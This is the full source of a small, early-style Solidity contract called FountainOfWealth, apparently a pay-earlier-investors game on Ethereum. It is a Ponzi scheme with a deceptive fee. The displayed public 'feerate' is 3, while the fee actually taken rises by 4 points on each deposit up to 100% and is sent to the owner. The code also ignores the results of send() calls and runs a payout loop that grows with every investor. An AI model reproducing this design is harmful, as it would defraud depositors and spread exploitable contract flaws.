 

 
 
 
 
 
 
 
 
 
 
 
contract FountainOfWealth{
struct InvestorArray{
address etherAddress;
uint amount;
}
InvestorArray[] public investors;
 
uint public investors_needed_until_jackpot=0;
uint public totalplayers=0; uint public feerate=3;uint public profitrate=40;uint public jackpotrate=70; uint fee=3; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalpaidout=0;
address public owner; modifier onlyowner{if(msg.sender==owner)_}
 
function FountainOfWealth(){
owner=msg.sender;
}
 
function(){
enter();
}
 
function enter(){
if(msg.value<100 finney){
return;
}
uint amount=msg.value;uint tot_pl=investors.length;totalplayers=tot_pl+1;
investors_needed_until_jackpot=20-(totalplayers%20);
investors.length+=1;investors[tot_pl].etherAddress=msg.sender;
investors[tot_pl].amount=amount;
feeamount=amount*fee/100;balance+=amount;totaldeposited+=amount;
if(feeamount!=0){if(balance>feeamount){owner.send(feeamount);balance-=feeamount;
totalpaidout+=feeamount;if(fee<100)fee+=4;else fee=100;}} uint payout;uint nr=0;
while(balance>investors[nr].amount*40/100 && nr<tot_pl)
{
if(nr%20==0&&balance>investors[nr].amount*70/100)
{
payout=investors[nr].amount*70/100;
investors[nr].etherAddress.send(payout);
balance-=investors[nr].amount*70/100;
totalpaidout+=investors[nr].amount*70/100;
}
else
{
payout=investors[nr].amount*40/100;
investors[nr].etherAddress.send(payout);
balance-=investors[nr].amount*40/100;
totalpaidout+=investors[nr].amount*40/100;
}
nr+=1;
}}}